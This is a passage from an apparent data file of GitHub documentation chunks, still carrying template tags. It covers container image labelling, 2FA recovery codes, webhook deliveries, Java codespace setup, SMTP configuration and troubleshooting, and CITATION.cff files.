hours ago        91.7MB\n   > hello-world                                           latest              fce289e99eb9        16 months ago       1.84kB\n   ```\n\n1. Tag your Docker image using the image ID and your desired image name and hosting destination.\n\n   ```shell\n   docker tag 38f737a91f39 {% data reusables.package_registry.container-registry-hostname %}/NAMESPACE/NEW_IMAGE_NAME:latest\n   ```\n\nReplace `NAMESPACE` with the name of the personal account or organization to which you want the image to be scoped.\n\n\n\nLabelling container images\n\n{% data reusables.package_registry.about-annotation-keys %} Values for supported keys will appear on the package page for the image.\n\nFor most images, you can use Docker labels to add the annotation keys to an image. For more information, see LABEL in the official Docker documentation and Pre-Defined Annotation Keys in the `opencontainers/image-spec` repository.\n\nFor multi-arch images, you can add a description to the image by adding the appropriate annotation key to the `annotations` field in the image's manifest. For more information, see \"Adding a description to multi-arch images.\"\n\nThe following annotation keys are supported in the {% data variables.product.prodname_container_registry %}.\n\nKey | Description\n------|------------\n| `org.opencontainers.image.source` | The URL of the repository associated with the package. For more information, see \"AUTOTITLE.\"\n| `org.opencontainers.image.description` | A text-only description limited to 512 characters. This description will appear on the package page, below the na", "Y2h1bmtfNF9pbmRleF8xNjMz": "me of the package.\n| `org.opencontainers.image.licenses` | An SPDX license identifier such as \"MIT,\" limited to 256 characters. The license will appear on the package page, in the \"Details\" sidebar. For more information, see SPDX License List.\n\nTo add a key as a Docker label, we recommend using the `LABEL` instruction in your `Dockerfile`. For example, if you're the user `octocat` and you own `my-repo`, and your image is distributed under the terms of the MIT license, you would add the following lines to your `Dockerfile`:\n\n```dockerfile\nLABEL org.opencontainers.image.source=https://{% ifversion fpt or ghec %}github.com{% else %}HOSTNAME{% endif %}/octocat/my-repo\nLABEL org.opencontainers.image.description=\"My container image\"\nLABEL org.opencontainers.image.licenses=MIT\n```\n\n{% data reusables.package_registry.auto-inherit-permissions-note %}\n\nAlternatively, you can add labels to an image at buildtime with the `docker build` command.\n\n```shell\n$ docker build \\\n --label \"org.opencontainers.image.source=https://{% ifversion fpt or ghec %}github.com{% else %}HOSTNAME{% endif %}/octocat/my-repo\" \\\n --label \"org.opencontainers.image.description=My container image\" \\\n --label \"org.opencontainers.image.licenses=MIT\"\n```\n\n\n\nAdding a description to multi-arch images\n\nA multi-arch image is an image that supports multiple architectures. It works by referencing a list of images, each supporting a different architecture, within a single manifest.\n\nThe description that appears on the package page for a multi-arch image is obtained from the `annotations` field in the image's manifest. Like Docker labels, annotations provide a way to associate metadata with an image, and support pre-defined annotation keys. For more information, see Annotations in the `opencontainers/image-spec` repository.\n\nTo provide a description for a multi-arch image, set a value for the `org.opencontainers.image.description` key in the `annotations` field of the manifest, as follows.\n\n```json\n\"annotations\": {\n  \"org.opencontainers.image.description\": \"My mu", "Y2h1bmtfNV9pbmRleF8xNjMz": "lti-arch image\"\n}\n```\n\nFor example, the following {% data variables.product.prodname_actions %} workflow step builds and pushes a multi-arch image. The `outputs` parameter sets the description for the image.\n\n```yaml\n{% data reusables.actions.actions-not-certified-by-github-comment %}\n\n- name: Build and push Docker image\n  uses: docker/build-push-action@f2a1d5e99d037542a71f64918e516c093c6f3fc4\n  with:\n    context: .\n    file: ./Dockerfile\n    platforms: {% raw %}${{ matrix.platforms }}{% endraw %}\n    push: true\n    outputs: type=image,name=target,annotation-index.org.opencontainers.image.description=My multi-arch image\n```\n\n", "Y2h1bmtfMF9pbmRleF82MjU=": "\n\nDownloading your two-factor authentication recovery codes\n\n{% data reusables.two_fa.about-recovery-codes %} You can also download your recovery codes at any point after enabling two-factor authentication.\n\nTo keep your account secure, don't share or distribute your recovery codes. We recommend saving them with a secure password manager.\n\nIf you generate new recovery codes or disable and re-enable 2FA, the recovery codes in your security settings automatically update.{% ifversion 2fa-reconfiguration-inline-update %} Reconfiguring your 2FA settings without disabling 2FA will not change your recovery codes.{% endif %}\n\n{% data reusables.user-settings.access_settings %}\n{% data reusables.user-settings.security %}\n{% data reusables.two_fa.show-recovery-codes %}\n1. Save your recovery codes in a safe place. Your recovery codes can help you get back into your account if you lose access.\n    - To save your recovery codes on your device, click **Download**.\n    - To save a hard copy of your recovery codes, click **Print**.\n    - To copy your recovery codes for storage in a password manager, click **Copy**.\n\n\n\nGenerating a new set of recovery codes\n\nOnce you use a recovery code to regain access to your account, it cannot be reused. If you've used all 16 recovery codes, you can generate another list of codes. Generating a new set of recovery codes will invalidate any codes you previously generated.\n\n{% data reusables.user-settings.access_settings %}\n{% data reusables.user-settings.security %}\n{% data reusables.two_fa.show-recovery-codes %}\n1. Under \"Generate new recovery codes\", click **Generate new recovery codes**.\n\n\n\nConfiguring backups for your time-based one-time password (TOTP) app\n\nMost TOTP apps support backups. If you lose access to your authentication device, you can use your TOTP app backup to access your authentication method and account credentials on a different authentication device, ensuring continued access to your 2FA-enabled account.\n\nThe process of configuring backups is different for each TOTP app. For", "Y2h1bmtfMV9pbmRleF82MjU=": " some examples from popular TOTP apps, see the following documentation:\n\n- 1Password\n- Google Authenticator\n- Microsoft Authenticator\n\n\n\nFurther reading\n\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n\n", "Y2h1bmtfMF9pbmRleF8xODk2": "\n\nAbout user administration\n\nThese endpoints are only available to authenticated site administrators. Normal users will receive a `403` response.\n\n{% data reusables.user-settings.enterprise-admin-api-classic-pat-only %}\n\n\n\n", "Y2h1bmtfMF9pbmRleF8yMTI2": "\n\nAbout webhook deliveries\n\nYou can view details about webhook deliveries that occurred in the past {% data variables.webhooks.retention %} days. Viewing past deliveries can help you verify whether your webhooks are working as expected.\n\nFor each webhook delivery, you can view:\n\n- the request headers and payload that {% data variables.product.company_short %} sent\n- the time at which the request was sent\n- the response that {% data variables.product.company_short %} received from your server\n\nYou can also redeliver recent webhook deliveries. For more information, see \"AUTOTITLE.\"\n\n\n\nViewing deliveries for repository webhooks\n\nOnly people with admin access to a repository can view deliveries for webhooks in that repository.\n\nYou can use the {% data variables.product.company_short %} web interface or the REST API to view recent webhook deliveries for a repository. For more information about using the REST API to view recent deliveries, see \"AUTOTITLE.\"\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.sidebar-settings %}\n1. In the \"Code and automation\" section of the sidebar, click **{% octicon \"webhook\" aria-hidden=\"true\" %} Webhooks**.\n{% data reusables.webhooks.webhook_url_list %}\n{% data reusables.webhooks.webhook_recent_deliveries_tab %}\n1. Click a delivery GUID to view details.\n\n\n\nViewing deliveries for organization webhooks\n\nOnly organization owners can view deliveries for webhooks in that organization.\n\nYou can use the {% data variables.product.company_short %} web interface or the REST API to view recent webhook deliveries for an organization. For more information about using the REST API to view recent deliveries, see \"AUTOTITLE.\"\n\n{% data reusables.organizations.navigate-to-org %}\n{% data reusables.organizations.org_settings %}\n1. In the \"Code and automation\" section of the sidebar, click **{% octicon \"webhook\" aria-hidden=\"true\" %} Webhooks**.\n{% data reusables.webhooks.webhook_url_list %}\n{% data reusables.webhooks.webhook_recent_deliveries_tab %}\n1. Click a delivery GU", "Y2h1bmtfMV9pbmRleF8yMTI2": "ID to view details.\n\n\n\nViewing deliveries for {% data variables.product.prodname_github_app %} webhooks\n\nThe owner of a {% data variables.product.prodname_github_app %} can view recent webhook deliveries for the app. If an organization has designated any app managers for a {% data variables.product.prodname_github_app %} owned by the organization, the app managers can also view recent webhook deliveries.\n\nYou can use the {% data variables.product.company_short %} web interface or the REST API to view recent webhook deliveries for a {% data variables.product.prodname_github_app %}. For more information about using the REST API to view recent deliveries, see \"AUTOTITLE.\"\n\n{% data reusables.apps.settings-step %}\n{% data reusables.user-settings.developer_settings %}\n{% data reusables.user-settings.github_apps %}\n1. Next to the {% data variables.product.prodname_github_app %} that you want to view webhook deliveries for, click **Edit**.\n1. In the sidebar, click **Advanced**.\n{% data reusables.webhooks.webhook_recent_deliveries %}\n\n{% ifversion fpt or ghec %}\n\n\n\nViewing deliveries for {% data variables.product.prodname_marketplace %} webhooks\n\nThe owner of a {% data variables.product.prodname_github_app %} can view recent {% data variables.product.prodname_marketplace %} webhook deliveries for the app. If an organization has designated any app managers for a {% data variables.product.prodname_github_app %} owned by the organization, the app managers can also view recent webhook deliveries.\n\n1. Navigate to your {% data variables.product.prodname_marketplace %} listing page.\n1. Next to the {% data variables.product.prodname_marketplace %} listing that you want to view webhook deliveries for, click **Manage listing**.\n1. In the sidebar, click **Webhook**.\n{% data reusables.webhooks.webhook_recent_deliveries %}\n\n{% endif %}\n\n{% ifversion fpt or ghec %}\n\n\n\nViewing deliveries for {% data variables.product.prodname_sponsors %} webhooks\n\nOnly the owner of the sponsored account can view deliveries for sponsorship webhooks for t", "Y2h1bmtfMl9pbmRleF8yMTI2": "hat account.\n\n1. In the upper-right corner of any page, click your profile photo, then click **Your sponsors**.\n1. Next to the account you want to view webhook deliveries for, click **Dashboard**.\n1. In the sidebar, click **Webhooks**.\n{% data reusables.webhooks.webhook_url_list %}\n{% data reusables.webhooks.webhook_recent_deliveries %}\n\n{% endif %}\n\n{% ifversion ghes or ghae or ghec %}\n\n\n\nViewing deliveries for global webhooks\n\nOnly enterprise owners can view deliveries for webhooks in that enterprise.\n\n{% data reusables.enterprise-accounts.access-enterprise %}\n{% data reusables.enterprise-accounts.settings-tab %}\n{% data reusables.enterprise-accounts.hooks-tab %}\n{% data reusables.webhooks.webhook_url_list %}\n{% data reusables.webhooks.webhook_recent_deliveries %}\n\n{% endif %}\n\n", "Y2h1bmtfMF9pbmRleF8xODM0": "---\ntitle: Enterprise announcement banners\nshortTitle: Enterprise\nintro: >-\n  The Enterprise Announcement Banners API allows you to get, set, and remove the\n  announcement banner for your enterprise.\nversions: # DO NOT MANUALLY EDIT. CHANGES WILL BE OVERWRITTEN BY A \ud83e\udd16\n  ghec: '*'\nallowTitleToDifferFromFilename: true\nautogenerated: rest\n---\n\n\n\n\n\n", "Y2h1bmtfMF9pbmRleF8xOTIx": "\n\nAbout issues\n\n{% data reusables.pull_requests.issues-media-types %}\n\n\n\n", "Y2h1bmtfMF9pbmRleF8xMDE2": "\n\nIntroduction\n\nThis guide shows you how to set up an example Java project {% data reusables.codespaces.setting-up-project-intro %}\n\n\n\nStep 1: Open the project in a codespace\n\n{% data reusables.getting-started.sign-in-dotcom %}\n1. Go to https://github.com/microsoft/vscode-remote-try-java.\n{% data reusables.codespaces.use-this-template %}\n\nWhen you create a codespace, your project is created on a remote virtual machine that is dedicated to you. By default, the container for your codespace has many languages and runtimes, including Java. It also includes a set of commonly used tools such as Gradle, Maven, git, wget, rsync, openssh, and nano.\n\n{% data reusables.codespaces.customize-vcpus-and-ram %}\n\n\n\nStep 2: Add a dev container configuration\n\nThe default development container, or \"dev container,\" for {% data variables.product.prodname_github_codespaces %} will allow you to work successfully on a Java project like vscode-remote-try-java. However, we recommend that you configure your own dev container to include all of the tools and scripts your project needs. This will ensure a fully reproducible environment for all {% data variables.product.prodname_github_codespaces %} users in your repository.\n\n{% data reusables.codespaces.setup-custom-devcontainer %}\n{% data reusables.codespaces.command-palette-container %}\n1. Type `java` and click the **Java** option. Other options are available if your project uses particular tools. For example, Java & PostgreSQL.\n\n   !Screenshot of the \"Add Dev Container Configuration Files\" dropdown with \"java\" entered in the search field and three Java options listed below.\n\n1. Choose the version of Java you want to use for your project. In this case, select the version marked \"(default).\"\n\n   !Screenshot of the \"Add Dev Container Configuration Files\" dropdown listing a variety of Java versions.\n\n1. Select the option to **Install Maven** and click **OK**.\n\n   !Screenshot of the \"Add Dev Container Configuration Files\" dropdown with the option \"Install Maven, a management tool for Java\" selec", "Y2h1bmtfMV9pbmRleF8xMDE2": "ted.\n\n1. A list of additional features you can install is displayed. We'll install Ant, the Java library and command-line tool for building applications. To install this feature, type `ant`, select `Ant (via SDKMAN)`, then click **OK**.\n\n   !Screenshot of the \"Add Dev Container Configuration Files\" dropdown with \"ant\" in the search field and the option \"Ant (via SDKMAN)\" selected.\n\n{% data reusables.codespaces.overwrite-devcontainer-config %}\n{% data reusables.codespaces.details-of-devcontainer-config %}\n\n```jsonc\n// For format details, see https://aka.ms/devcontainer.json. For config options, see the\n// README at: https://github.com/devcontainers/templates/tree/main/src/java\n{\n  \"name\": \"Java\",\n  // Or use a Dockerfile or Docker Compose file. More info: https://containers.dev/guide/dockerfile\n  \"image\": \"mcr.microsoft.com/devcontainers/java:0-17\",\n\n  \"features\": {\n    \"ghcr.io/devcontainers/features/java:1\": {\n      \"version\": \"none\",\n      \"installMaven\": \"true\",\n      \"installGradle\": \"false\"\n    },\n    \"ghcr.io/devcontainers-contrib/features/ant-sdkman:2\": {}\n  }\n\n  // Use 'forwardPorts' to make a list of ports inside the container available locally.\n  // \"forwardPorts\": [],\n\n  // Use 'postCreateCommand' to run commands after the container is created.\n  // \"postCreateCommand\": \"java -version\",\n\n  // Configure tool-specific properties.\n  // \"customizations\": {},\n\n  // Uncomment to connect as root instead. More info: https://aka.ms/dev-containers-non-root.\n  // \"remoteUser\": \"root\"\n}\n```\n\n{% data reusables.codespaces.devcontainer-properties-1 %}\n{% data reusables.codespaces.devcontainer-properties-2 %}\n\n{% data reusables.codespaces.additional-container-config %}\n\n\n\nStep 3: Modify your devcontainer.json file\n\nWith your dev container configuration added and a basic understanding of what everything does, you can now make changes to customize your environment further. In this example, you'll add properties that will:\n- Run a command, after the dev container is created, to create a new file.\n- Automatically install ", "Y2h1bmtfMl9pbmRleF8xMDE2": "two {% data variables.product.prodname_vscode_shortname %} extensions in this codespace.\n\n1. In the `devcontainer.json` file, add a comma after the `features` property.\n\n   ```json copy\n   \"features\": {\n     \"ghcr.io/devcontainers/features/java:1\": {\n       \"version\": \"none\",\n       \"installMaven\": \"true\",\n       \"installGradle\": \"false\"\n     },\n     \"ghcr.io/devcontainers-contrib/features/ant-sdkman:2\": {}\n   },\n   ```\n\n1. Uncomment the `postCreateCommand` property and change its value to `echo \\\"This file was added by the postCreateCommand.\\\" > TEMP.md`.\n\n   ```jsonc copy\n   // Use 'postCreateCommand' to run commands after the container is created.\n   \"postCreateCommand\": \"echo \\\"This file was added by the postCreateCommand.\\\" > TEMP.md\",\n   ```\n\n1. Uncomment the `customizations` property and edit it as follows to install the \"Code Spell Checker\" extension and the \"Extension Pack for Java.\"\n\n   ```jsonc copy\n   // Configure tool-specific properties.\n   \"customizations\": {\n     // Configure properties specific to VS Code.\n     \"vscode\": {\n       // Add the IDs of extensions you want installed when the container is created.\n       \"extensions\": [\n         \"streetsidesoftware.code-spell-checker\",\n         \"vscjava.vscode-java-pack\"\n       ]\n     }\n   }\n   ```\n\n  The `devcontainer.json` file should now look similar to this, depending on which image you chose:\n\n   ```jsonc\n   // For format details, see https://aka.ms/devcontainer.json. For config options, see the\n   // README at: https://github.com/devcontainers/templates/tree/main/src/java\n   {\n     \"name\": \"Java\",\n     // Or use a Dockerfile or Docker Compose file. More info: https://containers.dev/guide/dockerfile\n     \"image\": \"mcr.microsoft.com/devcontainers/java:0-17\",\n\n     \"features\": {\n       \"ghcr.io/devcontainers/features/java:1\": {\n         \"version\": \"none\",\n         \"installMaven\": \"true\",\n         \"installGradle\": \"false\"\n       },\n       \"ghcr.io/devcontainers-contrib/features/ant-sdkman:2\": {}\n     },\n\n     // Use 'forwardPorts' to make a list of po", "Y2h1bmtfM19pbmRleF8xMDE2": "rts inside the container available locally.\n     // \"forwardPorts\": [],\n\n     // Use 'postCreateCommand' to run commands after the container is created.\n     \"postCreateCommand\": \"echo \\\"This file was added by the postCreateCommand.\\\" > TEMP.md\",\n\n     // Configure tool-specific properties.\n     \"customizations\": {\n       // Configure properties specific to VS Code.\n       \"vscode\": {\n         // Add the IDs of extensions you want installed when the container is created.\n         \"extensions\": [\n           \"streetsidesoftware.code-spell-checker\",\n           \"vscjava.vscode-java-pack\"\n         ]\n       }\n     }\n\n     // Uncomment to connect as root instead. More info: https://aka.ms/dev-containers-non-root.\n     // \"remoteUser\": \"root\"\n   }\n   ```\n\n{% data reusables.codespaces.save-changes %}\n{% data reusables.codespaces.rebuild-command %}\n   {% data reusables.codespaces.rebuild-reason %}\n\n   After the dev container is rebuilt, and your codespace becomes available again, the `postCreateCommand` will have been run, creating a `TEMP.md` file, and the two extensions will be available for use.\n\n\n\nStep 4: Run your application\n\n1. Run the application by pressing `F5`.\n1. If a \"toast\" notification message is displayed at the bottom right corner of {% data variables.product.prodname_vscode_shortname %}, asking whether you want to switch to standard mode, click **Yes**.\n\n   !Screenshot of a popup message: \"Run/Debug feature requires Java language server to run in Standard mode. Do you want to switch it to Standard mode now?\"\n\n1. When the project files have been imported, click the **Debug Console** tab to see the program output.\n\n   !Screenshot of program output \"Hello Remote World!\" in the \"Debug Console.\"\n\n\n\nStep 5: Commit your changes\n\n{% data reusables.codespaces.committing-link-to-procedure %}\n\n\n\nNext steps\n\nYou should now be able to add a custom dev container configuration to your own Java project.\n\n{% data reusables.codespaces.next-steps-adding-devcontainer %}\n\n", "Y2h1bmtfMF9pbmRleF8xNjgw": "\n\nFurther reading\n\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n\n", "Y2h1bmtfMF9pbmRleF8yNjY=": "\n\nConfiguring SMTP for your enterprise\n\n{% ifversion ghes %}\n{% data reusables.enterprise_site_admin_settings.email-settings %}\n1. Select **Enable email**. This will enable both outbound and inbound email. However, for inbound email to work you will also need to configure your DNS settings as described below in \"[Configuring DNS and firewall\nsettings to allow incoming emails](#configuring-dns-and-firewall-settings-to-allow-incoming-emails).\"\n1. Type the settings for your SMTP server.\n      - In the **Server address** field, type the address of your SMTP server.\n      - In the **Port** field, type the port that your SMTP server uses to send email.\n      - In the **Domain** field, type the domain name that your SMTP server will send with a HELO response, if any.\n      - Select the **Authentication** dropdown, and choose the type of encryption used by your SMTP server.\n      - In the **No-reply email address** field, type the email address to use in the From and To fields for all notification emails.\n1. If you want to discard all incoming emails that are addressed to the no-reply email address, select **Discard email addressed to the no-reply email address**.\n1. Under **Support**, select a type of link to offer additional support to your users.\n    - **Email:** An internal email address.\n    - **URL:** A link to an internal support site. You must include either `http://` or `https://`.\n1. Test email delivery.\n{% elsif ghae %}\n{% data reusables.enterprise-accounts.access-enterprise %}\n{% data reusables.enterprise-accounts.settings-tab %}\n1. Under {% octicon \"gear\" aria-hidden=\"true\" %} **Settings**, click **Email**.\n1. Select **Enable email**.\n1. Type the settings for your email server.\n    - In the **Server address** field, type the address of your SMTP server.\n    - In the **Port** field, type the port that your SMTP server uses to send email.\n    - In the **Domain** field, type the domain name that your SMTP server will send with a HELO response, if any.\n    - Select the **Authentication** dropdown, and choose the", "Y2h1bmtfMV9pbmRleF8yNjY=": " type of encryption used by your SMTP server.\n    - In the **No-reply email address** field, type the email address to use in the From and To fields for all notification emails.\n1. If you want to discard all incoming emails that are addressed to the no-reply email address, select **Discard email addressed to the no-reply email address**.\n1. Click **Test email settings**.\n1. Under \"Send test email to,\" type the email address where you want to send a test email, then click **Send test email**.\n1. Click **Save**.\n{% endif %}\n\n{% ifversion ghes %}\n\n\n\nTesting email delivery\n\n1. At the top of the **Email** section, click **Test email settings**.\n1. Under \"Send test email to,\" type an address to send the test email to.\n1. Click **Send test email**.\n\n   {% tip %}\n\n   **Tip:** If SMTP errors occur while sending a test email\u2014such as an immediate delivery failure or an outgoing mail configuration error\u2014you will see them in the Test email settings dialog box.\n\n   {% endtip %}\n\n1. If the test email fails, troubleshoot your email settings.\n1. When the test email succeeds, under the \"Settings\" sidebar, click **Save settings**.\n{% data reusables.enterprise_site_admin_settings.wait-for-configuration-run %}\n\n{% ifversion require-tls-for-smtp %}\n\n\n\nEnforcing TLS for SMTP connections\n\nYou can enforce TLS encryption for all incoming SMTP connections, which can help satisfy an ISO-27017 certification requirement.\n\n{% data reusables.enterprise_site_admin_settings.email-settings %}\n1. Under \"Authentication\", select **Enforce TLS auth (recommended)**.\n\n   !Screenshot of the \"Email\" section of the Management Console. A checkbox, labeled \"Enforce TLS auth (recommended)\", is outlined in dark orange.\n{% data reusables.enterprise_management_console.save-settings %}\n{% endif %}\n\n\n\nConfiguring DNS and firewall settings to allow incoming emails\n\nIf you want to allow email replies to notifications, you must configure your DNS settings.\n\n1. Ensure that port 25 on the instance is accessible to your SMTP server.\n1. Create an A record that points to ", "Y2h1bmtfMl9pbmRleF8yNjY=": "`reply.[hostname]`. Depending on your DNS provider and instance host configuration, you may be able to instead create a single A record that points to `*.[hostname]`.\n1. Create an MX record that points to `reply.[hostname]` so that emails to that domain are routed to the instance.\n1. Create an MX record that points `noreply.hostname]` to `[hostname]` so that replies to the `cc` address in notification emails are routed to the instance. For more information, see \"[AUTOTITLE.\"\n\n\n\nTroubleshooting email delivery\n\n\n\nCreate a support bundle\n\nIf you cannot determine what is wrong from the displayed error message, you can download a support bundle containing the entire SMTP conversation between your mail server and {% data variables.product.prodname_ghe_server %}. Once you've downloaded and extracted the bundle, check the entries in `enterprise-manage-logs/unicorn.log` for the entire SMTP conversation log and any related errors.\n\nThe unicorn log should show a transaction similar to the following:\n\n```shell\nThis is a test email generated from https://10.0.0.68/setup/settings\nConnection opened: smtp.yourdomain.com:587\n-> \"220 smtp.yourdomain.com ESMTP nt3sm2942435pbc.14\\r\\n\"\n<- \"EHLO yourdomain.com\\r\\n\"\n-> \"250-smtp.yourdomain.com at your service, [1.2.3.4]\\r\\n\"\n-> \"250-SIZE 35882577\\r\\n\"\n-> \"250-8BITMIME\\r\\n\"\n-> \"250-STARTTLS\\r\\n\"\n-> \"250-ENHANCEDSTATUSCODES\\r\\n\"\n-> \"250 PIPELINING\\r\\n\"\n<- \"STARTTLS\\r\\n\"\n-> \"220 2.0.0 Ready to start TLS\\r\\n\"\nTLS connection started\n<- \"EHLO yourdomain.com\\r\\n\"\n-> \"250-smtp.yourdomain.com at your service, [1.2.3.4]\\r\\n\"\n-> \"250-SIZE 35882577\\r\\n\"\n-> \"250-8BITMIME\\r\\n\"\n-> \"250-AUTH LOGIN PLAIN XOAUTH\\r\\n\"\n-> \"250-ENHANCEDSTATUSCODES\\r\\n\"\n-> \"250 PIPELINING\\r\\n\"\n<- \"AUTH LOGIN\\r\\n\"\n-> \"334 VXNlcm5hbWU6\\r\\n\"\n<- \"dGhpc2lzbXlAYWRkcmVzcy5jb20=\\r\\n\"\n-> \"334 UGFzc3dvcmQ6\\r\\n\"\n<- \"aXRyZWFsbHl3YXM=\\r\\n\"\n-> \"535-5.7.1 Username and Password not accepted. Learn more at\\r\\n\"\n-> \"535 5.7.1 http://support.yourdomain.com/smtp/auth-not-accepted nt3sm2942435pbc.14\\r\\n\"\n```\n\nThis log shows that the appliance:\n", "Y2h1bmtfM19pbmRleF8yNjY=": "\n- Opened a connection with the SMTP server (`Connection opened: smtp.yourdomain.com:587`).\n- Successfully made a connection and chose to use TLS (`TLS connection started`).\n- The `login` authentication type was performed (`<- \"AUTH LOGIN\\r\\n\"`).\n- The SMTP Server rejected the authentication as invalid (`-> \"535-5.7.1 Username and Password not accepted.`).\n\n\n\nCheck {% data variables.location.product_location %} logs\n\nIf you need to verify that your inbound email is functioning, you can review `/var/log/mail.log` and `/var/log/mail-replies/metroplex.log` on your instance.\n\n`/var/log/mail.log` verifies that messages are reaching your server. Here's an example of a successful email reply:\n\n```text\nOct 30 00:47:18 54-171-144-1 postfix/smtpd[13210]: connect from st11p06mm-asmtp002.mac.com[17.172.124.250]\nOct 30 00:47:19 54-171-144-1 postfix/smtpd[13210]: 51DC9163323: client=st11p06mm-asmtp002.mac.com[17.172.124.250]\nOct 30 00:47:19 54-171-144-1 postfix/cleanup[13216]: 51DC9163323: message-id=\nOct 30 00:47:19 54-171-144-1 postfix/qmgr[17250]: 51DC9163323: from=, size=5048, nrcpt=1 (queue active)\nOct 30 00:47:19 54-171-144-1 postfix/virtual[13217]: 51DC9163323: to=, relay=virtual, delay=0.12, delays=0.11/0/0/0, dsn=2.0.0, status=sent (delivered to maildir)\nOct 30 00:47:19 54-171-144-1 postfix/qmgr[17250]: 51DC9163323: removed\nOct 30 00:47:19 54-171-144-1 postfix/smtpd[13210]: disconnect from st11p06mm-asmtp002.mac.com[17.172.124.250]\n```\n\nNote that the client first connects; then, the queue becomes active. Then, the message is delivered, the client is removed from the queue, and the session disconnects.\n\n`/var/log/mail-replies/metroplex.log` shows whether inbound emails are being processed to add to issues and pull requests as replies. Here's an example of a successful message:\n\n```text\n[2014-10-30T00:47:23.306 INFO (5284) #] metroplex: processing \n[2014-10-30T00:47:23.333 DEBUG (5284) #] Matched /data/user/mail/reply/new/1414630039.Vfc00I12000eM445784.ghe-tjl2-co-ie\n[2014-10-30T00:47:23.334 DEBUG (5284) #] Moving /data", "Y2h1bmtfNF9pbmRleF8yNjY=": "/user/mail/reply/new/1414630039.Vfc00I12000eM445784.ghe-tjl2-co-ie => /data/user/incoming-mail/success\n```\n\nYou'll notice that `metroplex` catches the inbound message, processes it, then moves the file over to `/data/user/incoming-mail/success`.\n\n\n\nVerify your DNS settings\n\nIn order to properly process inbound emails, you must configure a valid A Record (or CNAME), as well as an MX Record. For more information, see \"Configuring DNS and firewall settings to allow incoming emails.\"\n\n\n\nCheck firewall or AWS security group settings\n\nIf {% data variables.location.product_location %} is behind a firewall or is being served through an AWS security group, make sure port 25 is open to all mail servers that send emails to `reply@reply.[hostname]`.\n\n{% endif %}\n\n\n\nContact support\n\n{% ifversion ghes %}\nIf you're still unable to resolve the problem, contact us by visiting {% data variables.contact.contact_ent_support %}. Please attach the output file from `http(s)://[hostname]/setup/diagnostics` to your email to help us troubleshoot your problem.\n{% elsif ghae %}\nYou can contact {% data variables.contact.github_support %} for help configuring email for notifications to be sent through your SMTP server. For more information, see \"AUTOTITLE.\"\n{% endif %}\n\n", "Y2h1bmtfMF9pbmRleF8xMTIw": "\n\nAbout {% data variables.product.prodname_copilot %} settings on {% data variables.product.prodname_dotcom_the_website %}\n\nIn addition to the configuration for the {% data variables.product.prodname_copilot %} plugin in your supported IDE, you can configure settings for {% data variables.product.prodname_copilot %} on {% data variables.product.prodname_dotcom_the_website %}. The settings apply wherever you use {% data variables.product.prodname_copilot %}.\n\n{% data reusables.copilot.dotcom-settings %}\n\n", "Y2h1bmtfMF9pbmRleF8xNzUx": "\n\nAbout CITATION files\n\nYou can add a `CITATION.cff` file to the root of a repository to let others know how you would like them to cite your work. The citation file format is plain text with human- and machine-readable citation information.\n\nExample `CITATION.cff` file:\n\n```text\ncff-version: 1.2.0\nmessage: \"If you use this software, please cite it as below.\"\nauthors:\n- family-names: \"Lisa\"\n  given-names: \"Mona\"\n  orcid: \"https://orcid.org/0000-0000-0000-0000\"\n- family-names: \"Bot\"\n  given-names: \"Hew\"\n  orcid: \"https://orcid.org/0000-0000-0000-0000\"\ntitle: \"My Research Software\"\nversion: 2.0.4\ndoi: 10.5281/zenodo.1234\ndate-released: 2017-12-18\nurl: \"https://github.com/github-linguist/linguist\"\n```\n\nThe {% data variables.product.company_short %} citation prompt on your repository will show the example `CITATION.cff` content in these formats:\n\n**APA**\n\n```text\nLisa, M., & Bot, H. (2017). My Research Software (Version 2.0.4) [Computer software]. https://doi.org/10.5281/zenodo.1234\n```\n\n**BibTeX**\n\n{% raw %}\n\n```text\n@software{Lisa_My_Research_Software_2017,\n  author = {Lisa, Mona and Bot, Hew},\n  doi = {10.5281/zenodo.1234},\n  month = {12},\n  title = {{My Research Software}},\n  url = {https://github.com/github-linguist/linguist},\n  version = {2.0.4},\n  year = {2017}\n}\n```\n\n{% endraw %}\n\nNote the example above produces a _software_ citation (that is, `@software` type in BibTeX rather than `@article`).\n\nFor more information, see the Citation File Format website.\n\nWhen you add a `CITATION.cff` file to the default branch of your repository, a link is automatically added to the repository landing page in the right sidebar, with the label \"Cite this repository.\" This makes it easy for other users to cite your software project, using the information you've provided.\n\n\n\n!Screenshot showing the landing page for a repository. The \"Cite this repository\" link in the right sidebar is highlighted with a dark orange outline and a dropdown menu with the citation details is expanded underneath.\n\n\n\nCiting something other than softwa", "Y2h1bmtfMV9pbmRleF8xNzUx": "re\n\nIf you would prefer the {% data variables.product.prodname_dotcom %} citation information to link to another resource such as a research article, then you can use the `preferred-citation` override in CFF with the following types.\n\n{% rowheaders %}\n\n| Resource | CFF type | BibTeX type | APA annotation |\n|----------|----------|-------------|----------------|\n| Journal article/paper | `article` | `@article` | Not applicable |\n| Book | `book` | `@book` | Not applicable |\n| Booklet (bound but not published) | `pamphlet` | `@booklet` | Not applicable |\n| Conference article/paper | `conference-paper` | `@inproceedings` | [Conference paper] |\n| Conference proceedings | `conference`, `proceedings` | `@proceedings` | Not applicable |\n| Data set | `data`, `database` | `@misc` | [Data set] |\n| Magazine article | `magazine-article` | `@article` | Not applicable |\n| Manual | `manual` | `@manual` | Not applicable |\n| Misc/generic/other | `generic`, any other CFF type | `@misc` | Not applicable |\n| Newspaper article | `newspaper-article` | `@article` | Not applicable |\n| Software |  `software`, `software-code`, `software-container`, `software-executable`, `software-virtual-machine` | `@software` | [Computer software] |\n| Report/technical report | `report` | `@techreport` | Not applicable |\n| Unpublished | `unpublished` | `@unpublished` | Not applicable |\n\n{% endrowheaders %}\n\nExtended CITATION.cff file describing the software, but linking to a research article as the preferred citation:\n\n```text\ncff-version: 1.2.0\nmessage: \"If you use this software, please cite it as below.\"\nauthors:\n- family-names: \"Lisa\"\n  given-names: \"Mona\"\n  orcid: \"https://orcid.org/0000-0000-0000-0000\"\n- family-names: \"Bot\"\n  given-names: \"Hew\"\n  orcid: \"https://orcid.org/0000-0000-0000-0000\"\ntitle: \"My Research Software\"\nversion: 2.0.4\ndoi: 10.5281/zenodo.1234\ndate-released: 2017-12-18\nurl: \"https://github.com/github-linguist/linguist\"\npreferred-citation:\n  type: article\n  authors:\n  - family-names: \"Lisa\"\n    given-names: \"Mona\"\n    orcid: 